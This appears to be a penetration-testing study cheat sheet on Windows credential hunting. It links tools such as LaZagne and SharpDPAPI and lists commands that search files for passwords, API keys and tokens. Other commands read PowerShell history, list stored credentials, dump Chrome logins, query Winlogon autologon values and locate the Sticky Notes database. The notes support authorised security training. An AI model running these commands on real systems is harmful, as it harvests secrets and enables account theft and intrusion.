# Credential Hunting 
## Tools 
[Lazagne](https://github.com/AlessandroZ/LaZagne)

[SessionGopher](https://github.com/Arvanaghi/SessionGopher)

[Snaffler.exe](https://github.com/SnaffCon/Snaffler)

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

[SharpDpapiInstallation](https://deepwiki.com/GhostPack/SharpDPAPI/1.1-installation-and-setup)

## Machine
```
findstr /SIM /C:"password", "bob" *.txt *.ini *.cfg *.config *.xml  
```
```
findstr /I /S /N /C:"password" /C:"secret" /C:"api_key" /C:"apikey" /C:"token" /C:"credential" /C:"private_key" /C:"connection_string" /C:"client_secret" /C:"aws_access" /C:"azure_key" /C:"stripe" /C:"webhook" *.*
```
```
findstr /I /S /N /C:"password" *.env *.config *.json *.yaml *.yml *.xml *.properties *.ini *.cfg *.pem *.key *.p12 *.pfx *.crt
```
```
findstr /si password *.xml *.ini *.txt *.config
```

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

```
(Get-PSReadLineOption).HistorySavePath #displaying history save path
```
```
gc (Get-PSReadLineOption).HistorySavePath #reading information from history save path
```

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml' #[!note|Cleartext credential gathering]
```

```
cmdkey /list
```
## Browser 
```
\SharpChrome.exe logins /unprotect
```
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
**Sticky Notes**
```
C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqli
```

## Misc 
##  Citrix Breakout

[Citrix Breakout Information](https://docs.rtlcopymemory.com/privilege-escalation/windows-privilege-escalation/restricted-environments)
